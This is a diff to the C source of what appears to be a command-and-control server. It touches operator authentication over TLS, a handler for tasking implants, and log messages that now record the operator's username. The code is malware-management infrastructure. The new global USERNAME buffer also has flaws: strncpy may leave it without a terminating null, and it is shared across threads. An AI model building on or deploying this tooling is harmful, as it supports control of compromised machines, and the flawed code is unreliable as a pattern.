@@ -26,9 +26,11 @@
 #include "db.h"
 #include "logs.h"
 
+char USERNAME[0x50];
+
 int autheticate(SSL *ssl) {
     char auth[1024];
-    int bytes_received = SSL_read(ssl, auth, sizeof(auth));//recv(sock, auth, sizeof(auth), 0);
+    int bytes_received = SSL_read(ssl, auth, sizeof(auth));
     if (bytes_received <= 0) {
         perror("recv failed");
         return -1;
@@ -44,7 +46,6 @@ int autheticate(SSL *ssl) {
 
     cJSON *username = cJSON_GetObjectItem(creds, "username");
     
-
     if (username == NULL || !cJSON_IsString(username)) {
         fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
         cJSON_Delete(creds);
@@ -70,7 +71,7 @@ int autheticate(SSL *ssl) {
         char *reply_ = cJSON_Print(reply);
         //send(sock, reply_, strlen(reply_), 0);
         SSL_write(ssl, reply_, strlen(reply_));
-        log_message(LOG_INFO, "Operator Failed to authenticate");
+        log_message(LOG_INFO, "Operator failed to authenticate");
         free(reply_);
         free(reply);
         cJSON_Delete(creds);
@@ -81,14 +82,14 @@ int autheticate(SSL *ssl) {
     char *reply_ = cJSON_Print(reply);
     //send(sock, reply_, strlen(reply_), 0);
     SSL_write(ssl, reply_, strlen(reply_));
-    log_message(LOG_INFO, "Operator Authenticated Successfully");
+    strncpy(USERNAME, username->valuestring, 0x50);
+    log_message(LOG_INFO, "Operator [%s] authenticated successfully",USERNAME);
     free(reply_);
     free(reply);
 
     cJSON_Delete(creds);
     return 0;
 }
-
 
 char *interact_with_implant(cJSON *rinfo) {
     if (!rinfo) {
@@ -120,7 +121,6 @@ char *interact_with_implant(cJSON *rinfo) {
         char *data_t = cmd_and_response(task->valueint);
         snprintf(data, MAX_INFO, "%s", data_t);
         free(data_t);
-
     } 
     else if (strcmp(action_value, "new-task") == 0) {
         cJSON *command = cJSON_GetObjectItem(rinfo, "command");
@@ -214,7 +214,7 @@ void *operator_handler(void *Args) {
             SSL_write(ssl, data, strlen(data));
             free(data);
         } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
-            log_message(LOG_INFO, "Operator Exiting");
+            log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
             return NULL;
         }
         cJSON_Delete(requested_info);
@@ -330,7 +330,6 @@ void *Operator_conn(void* args) {
             continue;
         }
         log_message(LOG_INFO, "Operator Console connected successfully : Remote address : [%s:%d]", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
-
         // Detach thread so resources are automatically freed on exit
         pthread_detach(thread);
     }
